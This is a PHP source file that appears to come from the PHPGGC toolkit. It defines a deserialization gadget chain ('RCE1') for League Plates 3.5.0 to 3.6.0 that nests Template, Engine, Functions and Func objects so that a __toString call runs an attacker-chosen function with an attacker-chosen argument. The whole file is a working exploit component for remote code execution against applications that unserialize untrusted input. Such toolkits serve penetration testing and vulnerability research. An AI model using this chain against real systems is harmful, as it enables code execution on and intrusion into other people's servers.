<?php
namespace GadgetChain\Plates;

class RCE1 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '3.5.0 >= 3.6.0';
    public static $vector = '__toString';
    public static $author = 'Tris0n';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \League\Plates\Template\Template(
            new \League\Plates\Template\Template(
                new \League\Plates\Engine(
                    new \League\Plates\Template\Functions(
                        new \League\Plates\Template\Func(
                            $function
                        )
                    )
                )
            ),
            $parameter
        );
    }
}
